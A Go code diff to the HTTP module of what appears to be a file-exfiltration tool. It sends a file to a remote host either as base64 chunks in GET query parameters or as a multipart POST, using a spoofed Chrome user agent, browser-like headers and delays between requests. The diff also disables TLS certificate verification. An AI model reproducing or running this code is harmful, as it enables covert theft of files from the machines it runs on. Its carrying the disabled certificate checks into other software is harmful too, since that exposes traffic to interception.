@@ -2,6 +2,7 @@ package http
 
 import (
 	"bytes"
+	"crypto/tls"
 	b64 "encoding/base64"
 	"flag"
 	"fmt"
@@ -15,6 +16,8 @@ import (
 )
 
 const USERAGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+const ACCEPT = "text/html,application/xhtml+xml,application/xml"
+const ACCEPTLANGUAGE = "en-US"
 const GETBUFFER = 150
 
 func sendViaGet(url string, path string) {
@@ -47,13 +50,17 @@ func sendViaGet(url string, path string) {
 		}
 
 		request.Header.Add("User-Agent", USERAGENT)
-		request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml")
-		request.Header.Add("Accept-Language", "en-US")
+		request.Header.Add("Accept", ACCEPT)
+		request.Header.Add("Accept-Language", ACCEPTLANGUAGE)
 
-		client := &http.Client{}
+		transCfg := &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
+		}
+		client := &http.Client{Transport: transCfg}
+
 		q := request.URL.Query()
 		// f param is the filename
-		q.Add("f", path)
+		q.Add("f", filepath.Base(path))
 		// d param is the data
 		q.Add("d", sEnc)
 		// small sleep between requests
@@ -87,7 +94,7 @@ func sendViaPost(url string, path string) string {
 
 	body := &bytes.Buffer{}
 	writer := multipart.NewWriter(body)
-	part, err := writer.CreateFormFile("file", filepath.Base(path))
+	part, err := writer.CreateFormFile("filename", filepath.Base(path))
 
 	if err != nil {
 		fmt.Println(err)
@@ -104,10 +111,14 @@ func sendViaPost(url string, path string) string {
 	}
 
 	request.Header.Add("User-Agent", USERAGENT)
-	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml")
-	request.Header.Add("Accept-Language", "en-US")
+	request.Header.Add("Accept", ACCEPT)
+	request.Header.Add("Accept-Language", ACCEPTLANGUAGE)
 	request.Header.Add("Content-Type", writer.FormDataContentType())
-	client := &http.Client{}
+
+	transCfg := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
+	}
+	client := &http.Client{Transport: transCfg}
 
 	response, err := client.Do(request)
 
@@ -116,12 +127,6 @@ func sendViaPost(url string, path string) string {
 		return errorCode
 	}
 	defer response.Body.Close()
-
-	/*content, err := ioutil.ReadAll(response.Body)
-	if err != nil {
-		fmt.Println(err)
-		return errorCode
-	}*/
 
 	status := response.Status
 	return status
@@ -164,7 +169,7 @@ func HttpRun(data []string, file string) {
 		return
 	}
 
-	fmt.Printf("Sending file: %v (%d bytes) to %v\n", file, FILESIZE, host)
+	fmt.Printf("Sending file: %v (%d bytes) to %v\n", info.Name(), FILESIZE, host)
 	var status string
 	if method == "post" {
 		status = sendViaPost(host, file)
